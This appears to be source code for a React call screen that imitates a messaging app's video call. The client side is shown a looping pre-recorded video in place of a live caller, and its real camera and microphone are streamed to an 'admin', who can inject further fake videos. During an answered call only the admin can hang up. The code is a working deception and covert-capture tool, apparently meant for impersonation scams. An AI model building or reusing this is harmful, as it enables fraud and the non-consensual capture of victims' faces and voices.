import React, { useEffect, useRef, useState } from 'react';
import { store } from '../store';
import { CallState } from '../types';
import { 
  PhoneOff, Mic, MicOff, Video, VideoOff, 
  Volume2, VolumeX, RefreshCw, Plus, ChevronDown, Radio
} from 'lucide-react';

interface CallScreenProps {
  call: CallState;
  onEnd: () => void;
  peerName: string;
  peerAvatar: string;
  isAdminMode: boolean;
}

export default function CallScreen({ call, onEnd, peerName, peerAvatar, isAdminMode }: CallScreenProps) {
  const localVideoRef = useRef<HTMLVideoElement | null>(null);
  const remoteVideoRef = useRef<HTMLVideoElement | null>(null);
  const pcRef = useRef<RTCPeerConnection | null>(null);

  const [speakerOn, setSpeakerOn] = useState(true);
  const [facingMode, setFacingMode] = useState<'user' | 'environment'>('user');
  const [callDuration, setCallDuration] = useState(0);
  const [fakeAudioMuted, setFakeAudioMuted] = useState(false);

  const [localStream, setLocalStream] = useState<MediaStream | null>(null);
  const [remoteStream, setRemoteStream] = useState<MediaStream | null>(null);

  const dialtoneContextRef = useRef<AudioContext | null>(null);
  const ringIntervalRef = useRef<any>(null);

  const isCaller = (isAdminMode && call.caller === 'admin') || (!isAdminMode && call.caller === 'client');

  // Sound generator for call dialing / ringing phase
  useEffect(() => {
    if (call.status === 'ringing') {
      const AudioCtxClass = window.AudioContext || (window as any).webkitAudioContext;
      if (AudioCtxClass) {
        const ctx = new AudioCtxClass();
        dialtoneContextRef.current = ctx;

        const playRing = () => {
          if (ctx.state === 'suspended') ctx.resume();
          const osc1 = ctx.createOscillator();
          const osc2 = ctx.createOscillator();
          const gain = ctx.createGain();
          
          osc1.frequency.value = 440;
          osc2.frequency.value = 480;
          gain.gain.setValueAtTime(0.06, ctx.currentTime);
          
          osc1.connect(gain);
          osc2.connect(gain);
          gain.connect(ctx.destination);
          
          osc1.start();
          osc2.start();
          
          osc1.stop(ctx.currentTime + 1.2);
          osc2.stop(ctx.currentTime + 1.2);
        };

        playRing();
        ringIntervalRef.current = setInterval(playRing, 3500);
      }
    } else {
      if (ringIntervalRef.current) {
        clearInterval(ringIntervalRef.current);
        ringIntervalRef.current = null;
      }
      if (dialtoneContextRef.current) {
        try {
          if (dialtoneContextRef.current.state !== 'closed') {
            dialtoneContextRef.current.close();
          }
        } catch (e) {
          console.warn('Error closing dialtone AudioContext: ', e);
        }
        dialtoneContextRef.current = null;
      }
    }

    return () => {
      if (ringIntervalRef.current) {
        clearInterval(ringIntervalRef.current);
      }
      if (dialtoneContextRef.current) {
        try {
          dialtoneContextRef.current.close();
        } catch (e) {}
      }
    };
  }, [call.status]);

  // Acquire local webcam and microphone stream
  useEffect(() => {
    let stream: MediaStream | null = null;

    const startMedia = async () => {
      try {
        if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
          stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode },
            audio: true
          });
          setLocalStream(stream);
          if (localVideoRef.current) {
            localVideoRef.current.srcObject = stream;
          }
        } else {
          console.warn('Audio/Video media devices are not supported or blocked in this browser.');
        }
      } catch (err) {
        console.warn('Camera failed; attempting microphone-only stream:', err);
        try {
          if (navigator.mediaDevices && typeof navigator.mediaDevices.getUserMedia === 'function') {
            stream = await navigator.mediaDevices.getUserMedia({
              audio: true,
              video: false
            });
            setLocalStream(stream);
          }
        } catch (err2) {
          console.error('All media input devices access denied:', err2);
        }
      }
    };

    if (call.status === 'answered' || call.status === 'ringing') {
      startMedia();
    }

    return () => {
      if (stream) {
        stream.getTracks().forEach(track => track.stop());
      }
    };
  }, [call.status, facingMode]);

  // Manage WebRTC connection signaling in real-time using Firestore sync
  useEffect(() => {
    if (call.status !== 'answered' || !localStream) return;

    if (typeof RTCPeerConnection === 'undefined') {
      console.warn('RTCPeerConnection is not supported in this in-app browser.');
      return;
    }

    let pc: RTCPeerConnection;
    try {
      pc = new RTCPeerConnection({
        iceServers: [{ urls: 'stun:stun.l.google.com:19002' }]
      });
      pcRef.current = pc;
    } catch (e) {
      console.error('Failed to create RTCPeerConnection:', e);
      return;
    }

    // Stream our local tracks to the other side
    localStream.getTracks().forEach((track) => {
      pc.addTrack(track, localStream!);
    });

    // Handle remote tracks addition
    pc.ontrack = (event) => {
      if (event.streams && event.streams[0]) {
        setRemoteStream(event.streams[0]);
        if (remoteVideoRef.current) {
          remoteVideoRef.current.srcObject = event.streams[0];
        }
      }
    };

    // Gather ICE Candidates
    pc.onicecandidate = (event) => {
      if (event.candidate) {
        if (isCaller) {
          const currentCandidates = call.callerCandidates ? JSON.parse(call.callerCandidates) : [];
          if (!currentCandidates.some((c: any) => c.candidate === event.candidate?.candidate)) {
            store.updateCallSignaling({
              callerCandidates: JSON.stringify([...currentCandidates, event.candidate?.toJSON()])
            });
          }
        } else {
          const currentCandidates = call.receiverCandidates ? JSON.parse(call.receiverCandidates) : [];
          if (!currentCandidates.some((c: any) => c.candidate === event.candidate?.candidate)) {
            store.updateCallSignaling({
              receiverCandidates: JSON.stringify([...currentCandidates, event.candidate?.toJSON()])
            });
          }
        }
      }
    };

    // Run custom WebRTC SDP signaling handshake
    const negotiateOfferAnswer = async () => {
      if (isCaller) {
        const offer = await pc.createOffer();
        await pc.setLocalDescription(offer);
        store.updateCallSignaling({ sdpOffer: JSON.stringify(offer) });
      } else {
        if (call.sdpOffer && !pc.remoteDescription) {
          await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(call.sdpOffer)));
          const answer = await pc.createAnswer();
          await pc.setLocalDescription(answer);
          store.updateCallSignaling({ sdpAnswer: JSON.stringify(answer) });
        }
      }
    };

    negotiateOfferAnswer();

    return () => {
      pc.close();
      pcRef.current = null;
    };
  }, [call.status, !!localStream]);

  // Continuously apply incoming signals from the opposite peer
  useEffect(() => {
    const pc = pcRef.current;
    if (!pc || call.status !== 'answered') return;

    const applySignals = async () => {
      if (isCaller && call.sdpAnswer && !pc.remoteDescription) {
        try {
          await pc.setRemoteDescription(new RTCSessionDescription(JSON.parse(call.sdpAnswer)));
        } catch (e) {
          console.warn('Error setting remote description:', e);
        }
      }

      const targetCandidates = isCaller ? call.receiverCandidates : call.callerCandidates;
      if (targetCandidates) {
        try {
          const parsed = JSON.parse(targetCandidates);
          for (const cand of parsed) {
            try {
              await pc.addIceCandidate(new RTCIceCandidate(cand));
            } catch (err) {
              console.warn('Error adding ICE Candidate:', err);
            }
          }
        } catch (e) {}
      }
    };

    applySignals();
  }, [call.sdpOffer, call.sdpAnswer, call.callerCandidates, call.receiverCandidates]);

  // Sync microphone and camera state with browser media tracks
  useEffect(() => {
    if (localStream) {
      localStream.getAudioTracks().forEach((track) => {
        track.enabled = !call.muted;
      });
    }
  }, [call.muted, localStream]);

  useEffect(() => {
    if (localStream) {
      localStream.getVideoTracks().forEach((track) => {
        track.enabled = !call.videoMuted;
      });
    }
  }, [call.videoMuted, localStream]);

  // Mute speakerphone
  useEffect(() => {
    if (remoteVideoRef.current) {
      remoteVideoRef.current.muted = !speakerOn;
    }
  }, [speakerOn]);

  // Keep track of active timing
  useEffect(() => {
    let timer: any = null;
    if (call.status === 'answered') {
      timer = setInterval(() => {
        setCallDuration((prev) => prev + 1);
      }, 1000);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [call.status]);

  const formatDuration = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs < 10 ? '0' : ''}${secs}`;
  };

  const handleFlipCamera = () => {
    setFacingMode(prev => prev === 'user' ? 'environment' : 'user');
  };

  const handleInjectVideo = () => {
    const videoUrl = prompt('ইনজেক্ট করার জন্য একটি ডিরেক্ট MP4 ভিডিও লিংক দিন:', 'https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4');
    if (videoUrl && videoUrl.trim()) {
      store.injectVideoUrl(videoUrl.trim());
    }
  };

  return (
    <div className="absolute inset-x-0 top-0 bottom-0 bg-[#0c1317] text-white flex flex-col justify-between z-45 overflow-hidden select-none">
      
      {/* Background Media Stream */}
      <div className="absolute inset-0 pointer-events-none z-0">
        {!isAdminMode ? (
          /* Client side: Plays my-video.mp4 live continuously, completely muted */
          <video 
            src="/my-video.mp4" 
            className="w-full h-full object-cover opacity-80"
            autoPlay 
            loop 
            playsInline
            muted={true}
            controls={false}
            disablePictureInPicture
            controlsList="nodownload nofullscreen noremoteplayback"
            onContextMenu={(e) => e.preventDefault()}
          />
        ) : (
          /* Admin side: Shows Client's face / camera feed via WebRTC */
          remoteStream && call.status === 'answered' ? (
            <video 
              ref={remoteVideoRef}
              className="w-full h-full object-cover"
              autoPlay 
              playsInline
              controls={false}
              disablePictureInPicture
              controlsList="nodownload nofullscreen noremoteplayback"
              onContextMenu={(e) => e.preventDefault()}
            />
          ) : call.videoUrl && call.status === 'answered' ? (
            <video 
              src={call.videoUrl} 
              className="w-full h-full object-cover opacity-80"
              autoPlay 
              loop 
              playsInline
              muted={fakeAudioMuted}
              controls={false}
              disablePictureInPicture
              controlsList="nodownload nofullscreen noremoteplayback"
              onContextMenu={(e) => e.preventDefault()}
            />
          ) : (
            <div className="w-full h-full bg-[#121b22] flex items-center justify-center opacity-60">
              <div className="text-center p-6 space-y-3">
                <div className="w-24 h-24 bg-white/5 rounded-full mx-auto flex items-center justify-center border border-white/10 animate-pulse">
                  <Volume2 className="w-10 h-10 text-gray-500" />
                </div>
                <p className="text-xs text-gray-400 font-semibold uppercase tracking-wider">Connecting Client Face Video Feed...</p>
              </div>
            </div>
          )
        )}
      </div>

      {/* Floating local webcam preview overlay */}
      {call.status === 'answered' && !call.videoMuted && localStream && localStream.getVideoTracks().length > 0 && (
        <video 
          ref={localVideoRef}
          autoPlay 
          playsInline 
          muted 
          controls={false}
          disablePictureInPicture
          controlsList="nodownload nofullscreen noremoteplayback"
          onContextMenu={(e) => e.preventDefault()}
          className="absolute right-4 top-20 w-28 h-40 bg-black rounded-2xl border-2 border-white/20 object-cover shadow-2xl z-10 scale-x-[-1]"
        />
      )}

      {/* Header View */}
      <div className="relative pt-12 px-6 flex justify-between items-center z-10 w-full">
        <button 
          onClick={onEnd}
          className="bg-white/10 p-2.5 backdrop-blur-md rounded-full hover:bg-white/15 transition-all text-white"
        >
          <ChevronDown className="w-5 h-5" />
        </button>

        <div className="flex items-center gap-3">
          <button 
            onClick={handleFlipCamera}
            className="bg-white/10 p-2.5 backdrop-blur-md rounded-full hover:bg-white/15 transition-all"
            title="Flip Camera"
          >
            <RefreshCw className="w-5 h-5" />
          </button>
          
          <button 
            className="bg-white/10 p-2.5 backdrop-blur-md rounded-full hover:bg-white/15 transition-all"
            title="Add Participant"
          >
            <Plus className="w-5 h-5" />
          </button>
        </div>
      </div>

      {/* Centered Calling Profile card */}
      <div className="relative flex flex-col items-center text-center px-6 py-4 z-10 mt-4 mb-auto">
        <h2 className="text-2xl font-semibold tracking-tight leading-normal drop-shadow-md">{peerName}</h2>
        <p className="text-sm font-medium text-gray-300 mt-1 drop-shadow-xs">
          {call.status === 'ringing' ? 'Calling...' : call.status === 'answered' ? formatDuration(callDuration) : 'Connecting...'}
        </p>

        {call.status !== 'answered' && (
          <img 
            src={peerAvatar} 
            alt="Calling avatar" 
            className="w-32 h-32 rounded-full mt-8 object-cover border-4 border-white/10 shadow-2xl animate-pulse"
          />
        )}
      </div>

      {/* INCOMING ACTION (Answer widget fallback inside callscreen if ringing layout matches) */}
      {call.status === 'ringing' && ((isAdminMode && call.caller === 'client') || (!isAdminMode && call.caller === 'admin')) && (
        <div className="relative bottom-6 flex flex-col items-center gap-4 z-20 animate-bounce">
          <p className="text-xs font-semibold text-[#00a884] bg-[#e7fce3] px-4 py-1.5 rounded-full shadow-lg border border-[#e7fce3]/10">
            Incoming {call.type === 'video' ? 'Video' : 'Audio'} Call...
          </p>
          <button 
            onClick={() => store.answerCall()}
            className="w-16 h-16 bg-[#25D366] hover:bg-[#20ba59] text-white flex items-center justify-center rounded-full shadow-2xl border border-white/20 scale-110 active:scale-95 transition-all"
          >
            <Volume2 className="w-8 h-8 animate-pulse text-white" />
          </button>
        </div>
      )}

      {/* Bottom control panel */}
      <div className="relative p-8 flex flex-col items-center gap-6 z-10 w-full mb-4">
        {isAdminMode && call.videoUrl && call.status === 'answered' && (
          <button 
            onClick={() => setFakeAudioMuted(p => !p)}
            className={`px-5 py-2 rounded-full text-xs font-bold border flex items-center gap-2 shadow-lg transition-all backdrop-blur-md ${
              fakeAudioMuted 
                ? 'bg-gray-700/60 text-gray-200 border-gray-600' 
                : 'bg-[#a229cb]/60 text-white border-white/20'
            }`}
          >
            <span className="w-2 h-2 rounded-full bg-red-500 animate-ping inline-block" />
            Control Sound: {fakeAudioMuted ? 'Muted' : 'Unmuted'}
          </button>
        )}

        <div className="bg-[#232d36] rounded-3xl px-8 py-5 flex items-center justify-between w-full max-w-sm shadow-2xl relative border border-white/5">
          {/* Speaker Button */}
          <button 
            onClick={() => setSpeakerOn(!speakerOn)}
            className={`p-3.5 rounded-full transition-all ${
              speakerOn ? 'bg-white/15 text-white hover:bg-white/20' : 'text-gray-400 hover:text-white'
            }`}
            title="Speakerphone"
          >
            {speakerOn ? <Volume2 className="w-5.5 h-5.5" /> : <VolumeX className="w-5.5 h-5.5" />}
          </button>

          {/* Video Toggle Button */}
          <button 
            onClick={() => store.toggleCallVideoMuted()}
            className={`p-3.5 rounded-full transition-all ${
              !call.videoMuted ? 'bg-white/15 text-white hover:bg-white/20' : 'bg-red-500/25 text-red-500 hover:bg-red-500/30'
            }`}
            title="Camera Toggle"
          >
            {call.videoMuted ? <VideoOff className="w-5.5 h-5.5" /> : <Video className="w-5.5 h-5.5" />}
          </button>

          {/* Microphone Mute Button */}
          <button 
            onClick={() => store.toggleCallMuted()}
            className={`p-3.5 rounded-full transition-all ${
              !call.muted ? 'bg-white/15 text-white hover:bg-white/20' : 'bg-red-500/25 text-red-500 hover:bg-red-500/30'
            }`}
            title="Mute Mic"
          >
            {call.muted ? <MicOff className="w-5.5 h-5.5" /> : <Mic className="w-5.5 h-5.5" />}
          </button>

          {/* Inject demo video stream (Only Admin) */}
          {isAdminMode && (
            <button 
              onClick={handleInjectVideo}
              className="p-3.5 bg-[#a229cb]/45 text-white rounded-full hover:bg-[#a229cb]/55 transition-all"
              title="Inject Demo Video Stream"
            >
              <Radio className="w-5.5 h-5.5 text-purple-200" />
            </button>
          )}

          {/* End Call Button: During active answered call, only the Admin can see the end call button */}
          {!(call.status === 'answered' && !isAdminMode) ? (
            <button 
              onClick={onEnd}
              className="p-3.5 bg-red-600 text-white rounded-full hover:bg-red-700 active:scale-95 transition-all"
              title="Hang up"
            >
              <PhoneOff className="w-6 h-6 text-white" />
            </button>
          ) : (
            <div className="flex flex-col items-center justify-center px-1 text-center select-none">
              <span className="text-[10px] bg-emerald-500/10 text-emerald-400 px-2 py-1 rounded-md font-bold tracking-tight uppercase border border-emerald-500/10 whitespace-nowrap">
                Host Call
              </span>
            </div>
          )}
        </div>
      </div>

    </div>
  );
}
